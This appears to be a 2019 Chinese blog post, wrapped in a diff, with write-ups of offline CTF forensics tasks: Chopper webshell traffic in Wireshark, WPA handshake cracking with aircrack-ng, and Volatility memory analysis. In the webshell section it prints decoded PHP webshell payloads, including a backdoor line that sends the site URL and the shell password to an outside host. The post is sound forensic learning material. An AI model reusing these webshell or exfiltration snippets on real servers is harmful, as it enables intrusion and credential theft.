@@ -1,0 +1,653 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    
+    
+    <title>对某线下CTF的复盘以及反思 | 放荡不羁混世间 | B1ngDa0在这儿舞剑</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="keywords" content="CTF">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
+    <link rel="stylesheet" href="/css/style.css?v=1.4.2">
+    
+    <script type="text/javascript">
+        // Data Center
+        var DC = {
+            reward:	true,
+            lv: JSON.parse('{"enable":true,"app_id":"5qFlGhUV7fo3sxC2cSHAeMwU-gzGzoHsz","app_key":"pIKFHOkquTOmXNwhTKx9vBnu","icon":true}'),
+            v: JSON.parse('{"enable":true,"appid":"5qFlGhUV7fo3sxC2cSHAeMwU-gzGzoHsz","appkey":"pIKFHOkquTOmXNwhTKx9vBnu","notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
+            g: JSON.parse('{"enable":false,"lazy":true,"owner":"codefine","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
+            d: JSON.parse('{"app_id":null}')
+        };
+    </script>
+    <script type="text/javascript">
+        window.lazyScripts=[];
+    </script>
+    
+</head>
+
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide">
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap">
+      
+      <img src="/img/brand.jpg" class="brand-bg">
+      
+      <div class="brand">
+        <a href="/about" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">B1ngDa0</h5>
+          <a href="mailto:B1ngDa0@08sec.org" title="B1ngDa0@08sec.org" class="mail">
+            
+              <span>B</span>
+            
+              <span>1</span>
+            
+              <span>n</span>
+            
+              <span>g</span>
+            
+              <span>D</span>
+            
+              <span>a</span>
+            
+              <span>0</span>
+            
+              <span>@</span>
+            
+              <span>0</span>
+            
+              <span>8</span>
+            
+              <span>s</span>
+            
+              <span>e</span>
+            
+              <span>c</span>
+            
+              <span>.</span>
+            
+              <span>o</span>
+            
+              <span>r</span>
+            
+              <span>g</span>
+            
+          </a>
+        </hgroup>
+        
+        <ul class="menu-link">
+          
+              <li>
+                <a href="https://github.com/b1ngda0" target="_blank">
+                  <i class="icon icon-lg icon-github"></i>
+                </a>
+              </li>
+            
+        </ul>
+        
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                HOME
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                CATEGORIES
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                TAGS
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                ARCHIVES
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                ABOUT
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row clearfix">
+        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">
+            <span>对某线下CTF的复盘以及反思</span>
+            
+        </div>
+        
+        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
+            <i class="icon icon-lg icon-search"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+    <img src="/img/banner.jpg" class="header-bg">
+    <div class="container fade-scale">
+        <h1 class="title">对某线下CTF的复盘以及反思</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-09-11T05:31:32.000Z" itemprop="datePublished" class="page-time">
+  2019-09-11
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/CTF/">CTF</a></li></ul>
+
+            
+        </h5>
+        
+    </div>
+    
+
+</header>
+
+<div id="site_search">
+    <div class="search-title clearfix">
+        <span class="pull-left">
+          <i class="icon icon-lg icon-search"></i>
+        </span>
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
+        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
+          <i class="icon icon-lg icon-close"></i>
+        </a>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+
+
+<div class="container body-wrap">
+    <article id="post-对某线下CTF的复盘以及反思"
+  class="post-article article-type-post" itemprop="blogPost">
+    <div class="post-card">
+        <h1 class="post-card-title">对某线下CTF的复盘以及反思</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-09-11 13:31:32" datetime="2019-09-11T05:31:32.000Z"  itemprop="datePublished">2019-09-11</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/CTF/">CTF</a></li></ul>
+
+
+
+            
+	<span id="/2019/09/11/对某线下CTF的复盘以及反思/" class="leancloud_visitors" data-flag-title="对某线下CTF的复盘以及反思" title="对某线下CTF的复盘以及反思">
+		
+			<i class="icon icon-eye"></i>
+		
+		<span class="leancloud-visitors-count"></span>
+	</span>
+ 
+
+            
+    <span class="leancloud-comment">
+        <i class="icon icon-comment-o"></i>
+        <a href="/2019/09/11/对某线下CTF的复盘以及反思/#comment">
+            <span class="valine-comment-count" data-xid="/2019/09/11/对某线下CTF的复盘以及反思/"></span>
+        </a>
+    </span>
+
+
+
+            
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            
+            <blockquote>
+<p>author: B1ngDa0</p>
+</blockquote>
+<hr>
+<p>&emsp;&emsp;9月8日在杭州打了一场CTF线下赛，第一次专门参加一场CTF，而且还是线下无网环境。被理论题以及CTF解题困住、AWD打自闭。虽然结果比较凄惨，但是学习并了解了，相信下次会打的更好。这次就先来CTF解题的复现以及AWD的反思总结。</p>
+<h2 id="CTF-Misc"><a href="#CTF-Misc" class="headerlink" title="CTF_Misc"></a>CTF_Misc</h2><p>&emsp;&emsp;Misc 有三道题，主要是两个类型：</p>
+<ul>
+<li>流量分析</li>
+<li>内存取证</li>
+</ul>
+<p>&emsp;&emsp;复现的时候并没有觉得有多难，并且还感觉是比较老的题型（行吧，有网的人说话就是硬气。），但当时一道都没有做出来，我太菜了。平时积累不够，做CTF练习的时候根本没有去做web以外的，之后练习的时候也需要多关注其他的类型。</p>
+<h3 id="寻找webshell密码"><a href="#寻找webshell密码" class="headerlink" title="寻找webshell密码"></a>寻找webshell密码</h3><hr>
+<p>&emsp;&emsp;提示为：寻找到菜刀连接的密码，flag格式为 flag{xxx}，xxx为菜刀的连接密码。下载文件后为pcapng格式的数据包。使用Wireshark进行分析。</p>
+<figure class="image-box">
+                <a rel=对某线下CTF的复盘以及反思 href="https://i.loli.net/2019/09/10/4kQTBgw8shbt5XV.png" title="" data-fancybox="images"><img src="https://i.loli.net/2019/09/10/4kQTBgw8shbt5XV.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request.method==POST &amp;&amp; http contains &quot;php&quot;</span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;菜刀链接即限制请求为POST，并且缩小范围为PHP方便观看。</p>
+<figure class="image-box">
+                <a rel=对某线下CTF的复盘以及反思 href="https://i.loli.net/2019/09/10/jZgdwXmCD5OnWrF.png" title="" data-fancybox="images"><img src="https://i.loli.net/2019/09/10/jZgdwXmCD5OnWrF.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>&emsp;&emsp;直接找到了webshell.php的包，并且数据也是较常规的菜刀流量包，那密码不就是cmd了？不存在的，提交是不可能成功的。那么便继续分析数据包：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">cmd = $_=strrev(edoced_46esab);@eval($_($_POST[z0]));</span><br><span class="line">z0 = QGV2YWwoYmFzZTY0X2RlY29kZSgnYVdZb0pGOURUMDlMU1VWYkoweDVhMlVuWFNFOU1TbDdjMlYwWTI5dmEybGxLQ2RNZVd0bEp5d3hLVHRBWm1sc1pTZ25hSFIwY0RvdkwzZDNkeTVoY0drdVkyOXRMbVJsTDBGd2FTNXdhSEEvVlhKc1BTY3VKRjlUUlZKV1JWSmJKMGhVVkZCZlNFOVRWQ2RkTGlSZlUwVlNWa1ZTV3lkU1JWRlZSVk5VWDFWU1NTZGRMaWNtVUdGemN6MG5MbXRsZVNna1gxQlBVMVFwS1R0OScpKTtAaW5pX3NldCgiZGlzcGxheV9lcnJvcnMiLCIwIik7QHNldF90aW1lX2xpbWl0KDApO0BzZXRfbWFnaWNfcXVvdGVzX3J1bnRpbWUoMCk7ZWNobygiLT58Iik7OyREPWJhc2U2NF9kZWNvZGUoJF9QT1NUWyJ6MSJdKTskRj1Ab3BlbmRpcigkRCk7aWYoJEY9PU5VTEwpe2VjaG8oIkVSUk9SOi8vIFBhdGggTm90IEZvdW5kIE9yIE5vIFBlcm1pc3Npb24hIik7fWVsc2V7JE09TlVMTDskTD1OVUxMO3doaWxlKCROPUByZWFkZGlyKCRGKSl7JFA9JEQuIi8iLiROOyRUPUBkYXRlKCJZLW0tZCBIOmk6cyIsQGZpbGVtdGltZSgkUCkpO0AkRT1zdWJzdHIoYmFzZV9jb252ZXJ0KEBmaWxlcGVybXMoJFApLDEwLDgpLC00KTskUj0iXHQiLiRULiJcdCIuQGZpbGVzaXplKCRQKS4iXHQiLiRFLiIKIjtpZihAaXNfZGlyKCRQKSkkTS49JE4uIi8iLiRSO2Vsc2UgJEwuPSROLiRSO31lY2hvICRNLiRMO0BjbG9zZWRpcigkRik7fTtlY2hvKCJ8PC0iKTtkaWUoKTs=</span><br><span class="line"></span><br><span class="line">	-&gt;Decode:</span><br><span class="line">	@eval(base64_decode(&apos;aWYoJF9DT09LSUVbJ0x5a2UnXSE9MSl7c2V0Y29va2llKCdMeWtlJywxKTtAZmlsZSgnaHR0cDovL3d3dy5hcGkuY29tLmRlL0FwaS5waHA/VXJsPScuJF9TRVJWRVJbJ0hUVFBfSE9TVCddLiRfU0VSVkVSWydSRVFVRVNUX1VSSSddLicmUGFzcz0nLmtleSgkX1BPU1QpKTt9&apos;));@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(&quot;-&gt;|&quot;);;$D=base64_decode($_POST[&quot;z1&quot;]);$F=@opendir($D);if($F==NULL)&#123;echo(&quot;ERROR:// Path Not Found Or No Permission!&quot;);&#125;else&#123;$M=NULL;$L=NULL;while($N=@readdir($F))&#123;$P=$D.&quot;/&quot;.$N;$T=@date(&quot;Y-m-d H:i:s&quot;,@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R=&quot;\t&quot;.$T.&quot;\t&quot;.@filesize($P).&quot;\t&quot;.$E.&quot;</span><br><span class="line">&quot;;if(@is_dir($P))$M.=$N.&quot;/&quot;.$R;else $L.=$N.$R;&#125;echo $M.$L;@closedir($F);&#125;;echo(&quot;|&lt;-&quot;);die();</span><br><span class="line"></span><br><span class="line">	-&gt;Decode:</span><br><span class="line">	</span><br><span class="line">if($_COOKIE[&apos;Lyke&apos;]!=1)&#123;setcookie(&apos;Lyke&apos;,1);@file(&apos;http://www.api.com.de/Api.php?Url=&apos;.$_SERVER[&apos;HTTP_HOST&apos;].$_SERVER[&apos;REQUEST_URI&apos;].&apos;&amp;Pass=&apos;.key($_POST));&#125;</span><br><span class="line"></span><br><span class="line">z1 = YzpcXGluZXRwdWJcXHd3d3Jvb3RcXA==</span><br><span class="line"></span><br><span class="line">	-&gt;Decode:</span><br><span class="line"></span><br><span class="line">c:\\inetpub\\wwwroot\\</span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;可以看出是列出了c:\inetpub\wwwroot\的目录，查看响应包</p>
+<blockquote>
+<p>分析时需要注意的是只有建立连接和断开连接时才会显示HTTP协议，其余流量传输其实应该去TCP流中找（Follow TCP Stream）。</p>
+</blockquote>
+<p>&emsp;&emsp;跟踪 TCP 流：</p>
+<figure class="image-box">
+                <a rel=对某线下CTF的复盘以及反思 href="https://i.loli.net/2019/09/10/tKBAxfFa25zgE3l.png" title="" data-fancybox="images"><img src="https://i.loli.net/2019/09/10/tKBAxfFa25zgE3l.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>&emsp;&emsp;看到的是一套asp源码。</p>
+<p>&emsp;&emsp;后经过对数据包的分析发现，攻击者逐渐使用命令进入了wordpress的目录并且下载了 <a href="http://www.zip" target="_blank" rel="noopener">www.zip</a></p>
+<figure class="image-box">
+                <a rel=对某线下CTF的复盘以及反思 href="https://i.loli.net/2019/09/10/Qqa7j1iB3SZ9Crs.png" title="" data-fancybox="images"><img src="https://i.loli.net/2019/09/10/Qqa7j1iB3SZ9Crs.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>&emsp;&emsp;唯一有用的信息是这个rar压缩包。通过更改“显示和保存的数据为”-&gt;原始数据然后保存为rar文件打开即可看见源码。</p>
+<figure class="image-box">
+                <a rel=对某线下CTF的复盘以及反思 href="https://i.loli.net/2019/09/10/GDaTUeCjwIW9kRg.png" title="" data-fancybox="images"><img src="https://i.loli.net/2019/09/10/GDaTUeCjwIW9kRg.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>&emsp;&emsp;直接使用D盾查找webshell</p>
+<figure class="image-box">
+                <a rel=对某线下CTF的复盘以及反思 href="https://i.loli.net/2019/09/10/L9wFvg2u56eXNti.png" title="" data-fancybox="images"><img src="https://i.loli.net/2019/09/10/L9wFvg2u56eXNti.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>&emsp;&emsp;跟踪过去发现将一个文件读入了字符串</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">687474703a2f2f3132372e302e302e312f77702d636f6e74656e742f7468656d65732f7477656e74797369787465656e2f6a732f75692e6a73</span><br><span class="line"></span><br><span class="line">	-&gt;Decode:</span><br><span class="line">	</span><br><span class="line">http://127.0.0.1/wp-content/themes/twentysixteen/js/ui.js</span><br><span class="line">内容：</span><br><span class="line">QHJpbnkoJF9DQkZHWyJvN3BxbnMwMzBxNTlzc3JxNzMxcXBuMDFuMTU2NXJybyJdKQ==</span><br><span class="line"></span><br><span class="line">	-&gt;Decode:</span><br><span class="line">	</span><br><span class="line">@riny($_CBFG[&quot;o7pqns030q59ssrq731qpn01n1565rro&quot;])</span><br><span class="line">看着有种是反着的感觉，并且在前面的源码也是进行了</span><br><span class="line">字符串执行 ROT13 转换特征码:str_rot13()</span><br><span class="line">解码为：b7cdaf030d59ffed731dca01a1565eeb</span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;最终flag{b7cdaf030d59ffed731dca01a1565eeb}</p>
+<hr>
+<h3 id="寻找wifi密码"><a href="#寻找wifi密码" class="headerlink" title="寻找wifi密码"></a>寻找wifi密码</h3><p>&emsp;&emsp;提示为：wifi密码为 6666xxxx。下载为 pcap数据包，使用Wireshark进行分析</p>
+<figure class="image-box">
+                <a rel=对某线下CTF的复盘以及反思 href="https://i.loli.net/2019/09/10/ETkKCbB8d6VM52X.png" title="" data-fancybox="images"><img src="https://i.loli.net/2019/09/10/ETkKCbB8d6VM52X.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<blockquote>
+<p>考的是Wifi的认证过程中在WPA的四次握手包，也就只需要过滤eapol协议包</p>
+</blockquote>
+<p><a rel=对某线下CTF的复盘以及反思 href="https://i.loli.net/2019/09/10/gJszSIY7lwT14jG.png" title="" data-fancybox="images"><img src="https://i.loli.net/2019/09/10/gJszSIY7lwT14jG.png" alt></a></p>
+<p>&emsp;&emsp;除开一个重复的包，正好是四次握手包。并且在详细信息中知道了flag的格式:flag{05password-f059-448f}</p>
+<p>&emsp;&emsp;接下来就是破解wifi密码了</p>
+<p>&emsp;&emsp;可通过crunch或者python补全密码生成爆破字典。然后使用aircrack-ng进行密码破解：</p>
+<figure class="image-box">
+                <a rel=对某线下CTF的复盘以及反思 href="https://i.loli.net/2019/09/10/e6mdQM1C9oYOAbI.png" title="" data-fancybox="images"><img src="https://i.loli.net/2019/09/10/e6mdQM1C9oYOAbI.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>&emsp;&emsp;选择646 拥有WPA握手包的选项，此处的名字或者地址与之前Wireshark中的握手包中的信息应是相同。</p>
+<figure class="image-box">
+                <a rel=对某线下CTF的复盘以及反思 href="https://i.loli.net/2019/09/10/ublUxdwoV9FEYGR.png" title="" data-fancybox="images"><img src="https://i.loli.net/2019/09/10/ublUxdwoV9FEYGR.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>&emsp;&emsp;成功找到密码。</p>
+<p>&emsp;&emsp;最终flag{0566668912-f059-448f}</p>
+<hr>
+<h3 id="寻找小黑记录的内容"><a href="#寻找小黑记录的内容" class="headerlink" title="寻找小黑记录的内容"></a>寻找小黑记录的内容</h3><p>&emsp;&emsp;这是一道内存取证题。下载的压缩包内容为8.raw文件。这是通过内存取证工具Dumpit提取内存生成的内存转储文件，可使用Volatility进行取证。</p>
+<p>首先是得获取该内存数据是在什么操作系统下生成的。这能帮助Volatility更好的分析。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility imageinfo -f 8.raw</span><br></pre></td></tr></table></figure>
+
+<figure class="image-box">
+                <a rel=对某线下CTF的复盘以及反思 href="https://i.loli.net/2019/09/10/UnuLBNRJmQj4DGl.png" title="" data-fancybox="images"><img src="https://i.loli.net/2019/09/10/UnuLBNRJmQj4DGl.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>可以看出是WinXPSP2x86生成的</p>
+<p>在之后执行volatility 需带上，指定操作系统的属性：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--profile=WinXPSP2x86</span><br></pre></td></tr></table></figure>
+
+<p>根据题意，是通过查找小黑使用记事本编写的内容，于是使用notepad插件列出当前的记事本文本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility notepad -f 8.raw --profile=WinXPSP2x86</span><br></pre></td></tr></table></figure>
+
+<figure class="image-box">
+                <a rel=对某线下CTF的复盘以及反思 href="https://i.loli.net/2019/09/10/8DgMjNWoEtSFIUL.png" title="" data-fancybox="images"><img src="https://i.loli.net/2019/09/10/8DgMjNWoEtSFIUL.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>获取到</p>
+<p>flag{3661386562366162333565313332396130373363313239656230356332636566}</p>
+<p>进行解密（为base16编码方式）：</p>
+<figure class="image-box">
+                <a rel=对某线下CTF的复盘以及反思 href="https://i.loli.net/2019/09/10/joOu8bP2Ri56eNx.png" title="" data-fancybox="images"><img src="https://i.loli.net/2019/09/10/joOu8bP2Ri56eNx.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>最终flag{6a8eb6ab35e1329a073c129eb05c2cef}</p>
+<h2 id="AWD反思"><a href="#AWD反思" class="headerlink" title="AWD反思"></a>AWD反思</h2><p>&emsp;&emsp;直到AWD比赛正式开始前，对它都是充满期待的，想象着会是一场怎样体验。正式开始后，随着而来的是手忙脚乱的布防，比赛未开始前一直以为是三个人负责一台团队靶机，可以不那么慌，分工合作进行布防、发现漏洞、批量获取并提交flag。然而是一个团队三个靶机，来的猝不及防。一下子从分工合作变成单打独斗。有些手忙脚乱，通过文件监控以及D盾扫描找到一些后门。</p>
+<p>&emsp;&emsp;标题未某线下CTF是因为名字太长了懒得打，根据日期和地点可以知道是哪场比赛。在线上CTF的时候，各种资料信手拈来，各种方式可以尝试，但到线下无网环境显得手忙脚乱，需要更加的注意平时的记录整理以及记忆。这次的writeup也只是简单的Misc杂项，希望下次可以说出我骄傲地在赛场上获得了什么名次并且对多一些的题进行书写writeup。共勉，加油！</p>
+<p>原数据包地址：</p>
+<p>链接: <a href="https://pan.baidu.com/s/1OCcOodht_PPsy65WwKzoIg" target="_blank" rel="noopener">https://pan.baidu.com/s/1OCcOodht_PPsy65WwKzoIg</a> 提取码: gqhm</p>
+
+        </div>
+        
+<blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2019-09-11T07:59:00.912Z" itemprop="dateUpdated">2019-09-11 15:59:00</time>
+</span><br>
+
+
+        
+        转载注明出处，原文地址：<a href="/2019/09/11/对某线下CTF的复盘以及反思/" target="_blank" rel="external">https://www.b1ngda0.cn/2019/09/11/对某线下CTF的复盘以及反思/</a>
+        
+    </div>
+    <footer>
+        <a href="https://www.b1ngda0.cn">
+            <img src="/img/avatar.jpg" alt="B1ngDa0">
+            B1ngDa0
+        </a>
+    </footer>
+</blockquote>
+
+        
+            <div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+            
+        
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
+
+            <div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://www.b1ngda0.cn/2019/09/11/对某线下CTF的复盘以及反思/&title=《对某线下CTF的复盘以及反思》 — 放荡不羁混世间&pic=https://www.b1ngda0.cn/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://www.b1ngda0.cn/2019/09/11/对某线下CTF的复盘以及反思/&title=《对某线下CTF的复盘以及反思》 — 放荡不羁混世间&source=分享自己在网络安全方面的领悟，目前处于web安全以及靶机阶段" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+        </div>
+        
+            
+    <div id="comment"></div>
+
+
+
+        
+    </div>
+    
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+  
+
+  
+    <div class="next">
+      <a href="/2019/08/11/跟着靶机Writeup学BOF-Enterprise/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">跟着靶机Writeup学BOF_Enterprise</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+    
+    
+        <aside class="post-widget">
+            <nav class="post-toc-wrap" id="post-toc">
+                <strong>目录</strong>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#CTF-Misc"><span class="post-toc-number">1.</span> <span class="post-toc-text">CTF_Misc</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#寻找webshell密码"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">寻找webshell密码</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#寻找wifi密码"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">寻找wifi密码</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#寻找小黑记录的内容"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">寻找小黑记录的内容</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#AWD反思"><span class="post-toc-number">2.</span> <span class="post-toc-text">AWD反思</span></a></li></ol>
+            </nav>
+            <div class="toc-bar"><div>
+        </aside>
+    
+</article>
+
+    <div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        我们一起来让这个世界有趣一点
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/reward-wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/reward-wechat.jpg" data-alipay="/img/reward-alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+    
+
+</div>
+
+    </main>
+    <footer class="footer ">
+    
+    <div class="top">
+        
+            <p>
+    <span>Links：</span>
+    
+    <span class="blogroll-item">
+        <a href="https://www.b1ngda0.cn" target="_blank">HOME</a>
+    </span>
+    
+</p>
+
+        
+    </div>
+    
+    <div class="bottom">
+        <p>
+            <span>
+                B1ngDa0 &copy; 2019
+            </span>
+        		
+           	
+            
+            
+            
+            
+
+            
+                
+<span class="site-uv" title="总访客量">
+    <i class="icon icon-user"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>
+
+
+<span class="site-pv" title="总访问量">
+    <i class="icon icon-eye"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
+
+            
+        </p>
+    </div>
+</footer>
+
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://www.b1ngda0.cn/2019/09/11/对某线下CTF的复盘以及反思/&title=《对某线下CTF的复盘以及反思》 — 放荡不羁混世间&pic=https://www.b1ngda0.cn/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://www.b1ngda0.cn/2019/09/11/对某线下CTF的复盘以及反思/&title=《对某线下CTF的复盘以及反思》 — 放荡不羁混世间&source=分享自己在网络安全方面的领悟，目前处于web安全以及靶机阶段" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
